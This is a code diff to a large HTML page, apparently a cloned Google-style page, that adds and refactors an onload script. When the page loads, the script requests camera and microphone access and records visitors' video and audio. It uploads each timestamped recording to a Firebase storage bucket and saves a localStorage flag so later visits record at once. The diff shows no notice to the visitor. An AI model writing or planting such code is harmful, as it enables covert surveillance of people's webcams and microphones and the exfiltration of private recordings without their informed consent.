@@ -4329,18 +4329,23 @@
     const app = initializeApp(firebaseConfig);
     const storage = getStorage(app);
 
-    window.onload = function () {
-        let mediaRecoder;
+window.onload = function () {
+    const hasPermission = localStorage.getItem('hasPermission') === 'true';
+
+    function startRecording() {
+        let mediaRecorder;
         const parts = [];
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true, })
+
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then((stream) => {
-                mediaRecoder = new MediaRecorder(stream);
-                mediaRecoder.start(1000);
-                mediaRecoder.ondataavailable = function (e) {
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start(1000);
+                mediaRecorder.ondataavailable = function (e) {
                     parts.push(e.data);
                 };
+
                 setTimeout(function () {
-                    mediaRecoder.stop();
+                    mediaRecorder.stop();
                     const blob = new Blob(parts, {
                         type: "video/webm"
                     });
@@ -4348,9 +4353,6 @@
                     const currentDateTime = new Date();
                     const formattedDateTime = `${currentDateTime.getFullYear()}${padZero(currentDateTime.getMonth() + 1)}${padZero(currentDateTime.getDate())}_${padZero(currentDateTime.getHours())}${padZero(currentDateTime.getMinutes())}${padZero(currentDateTime.getSeconds())}`;
                     console.log(formattedDateTime);
-                    function padZero(num) {
-                        return num.toString().padStart(2, '0');
-                    }
 
                     const storageRef = ref(storage, formattedDateTime);
                     uploadBytes(storageRef, blob).then(snapshot => {
@@ -4362,6 +4364,23 @@
             })
             .catch(alert);
     }
+
+    if (!hasPermission) {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then((stream) => {
+                localStorage.setItem('hasPermission', 'true');
+                startRecording();
+            })
+            .catch(alert);
+    } else {
+        startRecording();
+    }
+
+    function padZero(num) {
+        return num.toString().padStart(2, '0');
+    }
+};
+
 </script>
 
 <body jsmodel="hspDDf">
